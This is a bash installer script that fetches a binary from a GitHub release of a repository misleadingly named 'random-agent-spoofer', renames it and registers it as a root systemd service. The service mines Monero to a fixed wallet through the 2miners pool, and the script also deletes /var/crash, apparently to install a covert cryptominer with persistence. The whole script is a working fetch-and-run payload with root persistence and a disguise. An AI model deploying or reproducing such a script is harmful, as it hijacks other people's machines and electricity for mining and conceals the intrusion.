#!/bin/bash
cd /home
sudo wget https://github.com/trangtrau/random-agent-spoofer/releases/download/va/ar 
sudo cp ar jvdar 
sudo chmod +x jvdar

sudo rm -rf /lib/systemd/system/xmrthanh.service
sudo rm -rf /var/crash
bash -c 'cat <<EOT >>/lib/systemd/system/xmrthanh.service 
[Unit]
Description=xmrthanh
After=network.target
[Service]
ExecStart= /home/jvdar --coin=XMR -o xmr.2miners.com:2222 -u 8425srC9otSi9tfr2HgvFNj8P3LW6egpVceVtHzh4quhZESXEEvXntW8QeeddnNRKDjm25jfw4YLda6mzHVcY3jFV34Sv9e.The -p x
WatchdogSec=36000
Restart=always
RestartSec=60
User=root
[Install]
WantedBy=multi-user.target
EOT
' &&
systemctl daemon-reload &&
systemctl enable xmrthanh.service &&
service xmrthanh stop  &&
service xmrthanh restart
